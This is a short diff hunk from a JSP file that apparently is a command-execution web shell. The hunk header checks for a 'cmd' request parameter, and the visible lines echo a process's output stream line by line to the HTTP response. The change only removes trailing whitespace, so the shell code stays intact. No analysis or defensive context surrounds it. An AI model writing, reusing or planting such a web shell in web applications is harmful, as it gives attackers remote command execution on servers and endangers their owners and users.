@@ -14,8 +14,8 @@ if (request.getParameter("cmd") != null) {
         DataInputStream dis = new DataInputStream(in);
         String disr = dis.readLine();
         while ( disr != null ) {
-                out.println(disr); 
-                disr = dis.readLine(); 
+                out.println(disr);
+                disr = dis.readLine();
                 }
         }
 %>
